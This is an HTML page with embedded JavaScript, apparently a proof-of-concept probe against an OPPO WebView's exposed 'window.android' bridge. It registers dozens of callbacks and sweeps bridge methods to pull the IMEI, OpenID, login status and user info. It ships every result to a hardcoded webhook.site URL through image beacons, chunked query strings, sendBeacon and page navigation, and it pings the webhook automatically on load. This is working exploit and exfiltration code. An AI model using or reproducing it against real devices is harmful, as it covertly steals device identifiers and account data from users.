<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>OPPO Sensitive Callback Probe v7</title>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
  <style>
    * { box-sizing: border-box; }
    body { margin:0; padding:22px 16px 90px; background:#050505; color:#f5f5f5; font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; font-size:22px; line-height:1.45; }
    h1 { margin:0 0 12px; font-size:38px; line-height:1.12; }
    .warn { color:#ff5470; font-weight:900; font-size:23px; }
    .box { background:#121212; border:1px solid #444; border-radius:18px; padding:14px; margin:14px 0; word-break:break-word; }
    button { width:100%; border:0; border-radius:16px; padding:18px; margin:8px 0; font-size:22px; font-weight:900; background:#43d08d; color:#07140d; }
    button.secondary { background:#e9e9e9; color:#111; }
    button.danger { background:#ff5470; color:#111; }
    .status { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; white-space:pre-wrap; font-size:19px; }
    .card { background:#151515; border:1px solid #333; border-radius:18px; padding:14px; margin:12px 0; }
    .card h2 { margin:0 0 10px; font-size:25px; }
    .ok { color:#5cff9f; font-weight:900; }
    .bad { color:#ff667f; font-weight:900; }
    .muted { color:#aaa; }
    .kv { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:17px; white-space:pre-wrap; word-break:break-word; }
    pre { display:none; background:#eee; color:#111; border-radius:12px; padding:14px; font-size:15px; white-space:pre-wrap; word-break:break-word; }
  </style>
</head>
<body>
<h1>OPPO Sensitive Callback Probe v7</h1>
<p class="warn">Goal: detect callback-delivered IMEI/OpenID/login/user data, not only direct return values.</p>

<div id="target" class="box status"></div>

<button onclick="runSensitiveCallbackSweep()">Run sensitive callback sweep</button>
<button class="secondary" onclick="runDirectRawAgain()">Run direct raw again</button>
<button class="secondary" onclick="pingWebhook()">Ping webhook</button>
<button class="danger" onclick="navigateWebhook()">NAVIGATE webhook ping</button>
<button class="secondary" onclick="toggleJson()">Toggle full JSON</button>

<div id="status" class="box status">WAITING</div>
<div id="cards"></div>
<pre id="out"></pre>

<script>
(function(){
  const WEBHOOK = "https://webhook.site/0b200f5d-c245-4872-bbe3-edde79de0fee";
  const VERSION = "sensitive_callback_probe_v7";
  const ACTIONS = [
    "account_islogin",
    "account_get_userid",
    "account_get_userinfo",
    "get_open_id",
    "get_imei",
    "get_channel_id"
  ];
  const DIRECT_METHODS = ["getImei","getOpenId","getLoginInfo","isLogin","getChannelId"];
  const CALLBACK_KEYS = [
    "callback","callbackName","callback_name","cb","cbName","jsCallback","js_callback",
    "success","successCallback","complete","completeCallback","onSuccess","onComplete",
    "function","func","handler","callbackId","callback_id"
  ];

  window.__OPPO_V7_WEBHOOK = WEBHOOK;
  window.__OPPO_V7_CALLBACKS = [];
  window.__OPPO_V7_LAST_PAYLOAD = null;

  document.getElementById("target").textContent =
    "WEBHOOK=" + WEBHOOK + "\nVERSION=" + VERSION + "\nbridge=" + (!!window.android) + "\nua=" + navigator.userAgent;

  function safeString(x) {
    try {
      if (x === undefined) return "undefined";
      if (x === null) return "null";
      if (typeof x === "string") return x;
      if (typeof x === "number" || typeof x === "boolean") return String(x);
      return JSON.stringify(x);
    } catch(e) {
      try { return String(x); } catch(_) { return "[unstringifiable]"; }
    }
  }

  function short(x, n) {
    const s = safeString(x);
    return s.length <= n ? s : s.slice(0,n) + "...[+" + (s.length-n) + " chars]";
  }

  function describeBridge() {
    const a = window.android;
    if (!a || typeof a !== "object") return { exists:false, type:typeof a };
    let ownKeys = [], functionKeys = [];
    try {
      ownKeys = Object.getOwnPropertyNames(a).slice(0,200);
      functionKeys = ownKeys.filter(k => { try { return typeof a[k] === "function"; } catch(e){ return false; } });
    } catch(e) {}
    return { exists:true, type:typeof a, tag:Object.prototype.toString.call(a), ownKeys, functionKeys };
  }

  function base(eventType, reason) {
    return {
      eventType, version: VERSION, ts: new Date().toISOString(), reason,
      location: { href: location.href, origin: location.origin, protocol: location.protocol, referrer: document.referrer || null },
      environment: { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, cookieEnabled: navigator.cookieEnabled, webdriver: navigator.webdriver },
      androidBridge: describeBridge()
    };
  }

  function callBridge(method, args) {
    const item = { method, args: args || [], exists:false, ok:false, returnType:null, rawReturnValue:null, empty:null, error:null };
    try {
      const a = window.android;
      if (!a || typeof a !== "object") { item.error = "window.android missing"; return item; }
      item.exists = typeof a[method] === "function";
      if (!item.exists) { item.error = "missing_or_not_function"; return item; }
      const ret = a[method].apply(a, args || []);
      const raw = safeString(ret);
      item.ok = true; item.returnType = typeof ret; item.rawReturnValue = raw;
      item.empty = raw === "" || raw === "undefined" || raw === "null";
      return item;
    } catch(e) {
      item.error = String(e && (e.stack || e.message || e));
      return item;
    }
  }

  function callOneArg(method, arg, meta) {
    const item = { bridgeMethod: method, arg, meta: meta || null, exists:false, ok:false, returnType:null, rawReturnValue:null, empty:null, error:null };
    try {
      const a = window.android;
      if (!a || typeof a !== "object") { item.error = "window.android missing"; return item; }
      item.exists = typeof a[method] === "function";
      if (!item.exists) { item.error = "missing_or_not_function"; return item; }
      const ret = a[method](arg);
      const raw = safeString(ret);
      item.ok = true; item.returnType = typeof ret; item.rawReturnValue = raw;
      item.empty = raw === "" || raw === "undefined" || raw === "null";
      return item;
    } catch(e) {
      item.error = String(e && (e.stack || e.message || e));
      return item;
    }
  }

  function send(payload) {
    window.__OPPO_V7_LAST_PAYLOAD = payload;
    const json = JSON.stringify(payload);
    try { new Image().src = WEBHOOK + "/v7-ping?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android); } catch(e) {}
    try { new Image().src = WEBHOOK + "/v7-summary?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&d=" + encodeURIComponent(json.slice(0,2500)); } catch(e) {}
    try {
      const enc = encodeURIComponent(json);
      const size = 1500;
      const total = Math.ceil(enc.length / size);
      for (let i=0; i<Math.min(total,18); i++) {
        const img = new Image();
        img.src = WEBHOOK + "/v7-chunk?event=" + encodeURIComponent(payload.eventType) + "&idx=" + i + "&total=" + total + "&t=" + Date.now() + "&d=" + enc.slice(i*size,(i+1)*size);
      }
    } catch(e) {}
    try { navigator.sendBeacon(WEBHOOK + "/v7-beacon?event=" + encodeURIComponent(payload.eventType), new Blob([json], {type:"text/plain"})); } catch(e) {}
  }

  function render(payload) {
    document.getElementById("status").textContent =
      payload.eventType + "\n" + payload.ts + "\nbridge=" + (!!window.android) + "\ncallbackCount=" + (window.__OPPO_V7_CALLBACKS || []).length;
    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
    const root = document.getElementById("cards");
    root.innerHTML = "";

    const callbacks = payload.callbacks || [];
    const nonEmptyCallbacks = callbacks.filter(c => {
      const raw = safeString(c.args);
      return raw && raw !== "[]" && raw !== "undefined" && raw !== "null";
    });

    const top = document.createElement("div");
    top.className = "card";
    top.innerHTML = "<h2>" + payload.eventType + "</h2><div class='kv'>callbacks=" + callbacks.length + "\nnonEmptyCallbacks=" + nonEmptyCallbacks.length + "\nresults=" + ((payload.results||[]).length) + "</div>";
    root.appendChild(top);

    const cbCard = document.createElement("div");
    cbCard.className = "card";
    if (nonEmptyCallbacks.length) {
      cbCard.innerHTML = "<h2 class='ok'>CALLBACK_NON_EMPTY count=" + nonEmptyCallbacks.length + "</h2>";
      nonEmptyCallbacks.slice(0,20).forEach(c => {
        const d = document.createElement("div");
        d.className = "kv";
        d.style.marginTop = "10px";
        d.textContent = "name=" + c.name + "\nargs=" + short(c.args, 1600) + "\nmeta=" + short(c.meta, 800);
        cbCard.appendChild(d);
      });
    } else {
      cbCard.innerHTML = "<h2 class='bad'>NO_CALLBACK_DATA_YET</h2><div class='kv'>No callback-delivered non-empty sensitive/account value observed.</div>";
    }
    root.appendChild(cbCard);

    const results = payload.results || [];
    const nonEmptyReturns = results.filter(r => r.ok && !r.empty && safeString(r.rawReturnValue) !== "");
    const retCard = document.createElement("div");
    retCard.className = "card";
    if (nonEmptyReturns.length) {
      retCard.innerHTML = "<h2 class='ok'>RETURN_NON_EMPTY count=" + nonEmptyReturns.length + "</h2>";
      nonEmptyReturns.slice(0,30).forEach(r => {
        const d = document.createElement("div");
        d.className = "kv";
        d.style.marginTop = "10px";
        d.textContent = "method=" + (r.method || r.bridgeMethod) + "\narg=" + short(r.arg || r.args, 900) + "\nrawReturnValue=" + short(r.rawReturnValue, 1200);
        retCard.appendChild(d);
      });
    } else {
      retCard.innerHTML = "<h2 class='bad'>NO_NON_EMPTY_RETURN</h2>";
    }
    root.appendChild(retCard);

    send(payload);
  }

  function registerCallback(name, meta) {
    window[name] = function() {
      const args = Array.prototype.slice.call(arguments).map(safeString);
      const entry = { name, meta: meta || null, ts: new Date().toISOString(), args };
      window.__OPPO_V7_CALLBACKS.push(entry);
      const payload = base("OPPO_V7_CALLBACK_FIRED", "native_callback");
      payload.callback = entry;
      payload.callbacks = window.__OPPO_V7_CALLBACKS;
      render(payload);
      return "OPPO_V7_CALLBACK_RECEIVED";
    };
  }

  function prepareCallbacks() {
    window.__OPPO_V7_CALLBACKS = [];
    const generic = [
      "callback","cb","success","complete","onSuccess","onComplete",
      "oppoCallback","oppoJsCallback","nativeCallback","jsCallback",
      "OPPO_CALLBACK","OPPO_JS_CALLBACK","OPPO_NATIVE_CALLBACK"
    ];
    generic.forEach(n => registerCallback(n, {kind:"generic"}));
  }

  window.runSensitiveCallbackSweep = function() {
    prepareCallbacks();
    const payload = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_RESULT", "manual_sensitive_callback_sweep");
    const results = [];
    let idx = 0;

    for (const action of ACTIONS) {
      for (const key of CALLBACK_KEYS) {
        const cbName = "OPPO_CB_" + idx++;
        registerCallback(cbName, { action, key, bridge:"dispatcher" });

        const variants = [
          { type: action, [key]: cbName },
          { type: action, data: {}, [key]: cbName },
          { type: action, params: {}, [key]: cbName },
          { id: "oppo_audit_" + action + "_" + key, type: action, data: {}, [key]: cbName },
          { id: "oppo_audit_" + action + "_" + key, type: action, params: {}, [key]: cbName }
        ];

        for (const v of variants) {
          const arg = JSON.stringify(v);
          results.push(callOneArg("callNativeApi", arg, { action, key, cbName }));
          results.push(callOneArg("callAsyncNativeApi", arg, { action, key, cbName }));
        }
      }
    }

    for (const method of DIRECT_METHODS) {
      for (let j=0; j<8; j++) {
        const cbName = "OPPO_DIRECT_CB_" + method + "_" + j;
        registerCallback(cbName, { method, bridge:"direct" });
        const argsList = [
          [cbName],
          [JSON.stringify({ callback: cbName })],
          [JSON.stringify({ callbackName: cbName })],
          [JSON.stringify({ cb: cbName })],
          [JSON.stringify({ jsCallback: cbName })],
          [JSON.stringify({ success: cbName })],
          [JSON.stringify({ complete: cbName })],
          [JSON.stringify({ id: cbName })]
        ];
        results.push(callBridge(method, argsList[j]));
      }
    }

    payload.results = results;
    payload.callbacks = window.__OPPO_V7_CALLBACKS;
    render(payload);

    setTimeout(function(){
      const p2 = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_AFTER_1500MS", "after_wait_1500ms");
      p2.results = results;
      p2.callbacks = window.__OPPO_V7_CALLBACKS;
      render(p2);
    }, 1500);

    setTimeout(function(){
      const p3 = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_AFTER_5000MS", "after_wait_5000ms");
      p3.results = results;
      p3.callbacks = window.__OPPO_V7_CALLBACKS;
      render(p3);
    }, 5000);
  };

  window.runDirectRawAgain = function() {
    const payload = base("OPPO_V7_DIRECT_RAW_RESULT", "manual_direct_raw_again");
    payload.results = DIRECT_METHODS.concat(["getPackageName","getDeviceModel","getNetworkType","getRomVersion","getRomVersionCode"]).map(m => callBridge(m, []));
    payload.callbacks = window.__OPPO_V7_CALLBACKS || [];
    render(payload);
  };

  window.pingWebhook = function() {
    const payload = base("OPPO_V7_PING", "manual_ping");
    payload.callbacks = window.__OPPO_V7_CALLBACKS || [];
    render(payload);
  };

  window.navigateWebhook = function() {
    location.href = WEBHOOK + "/v7-nav-ping?event=OPPO_V7_NAV_PING&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android) + "&ua=" + encodeURIComponent(navigator.userAgent.slice(0,180));
  };

  window.toggleJson = function() {
    const p = document.getElementById("out");
    p.style.display = p.style.display === "block" ? "none" : "block";
  };

  setTimeout(function(){ pingWebhook(); }, 1000);
})();
</script>
</body>
</html>
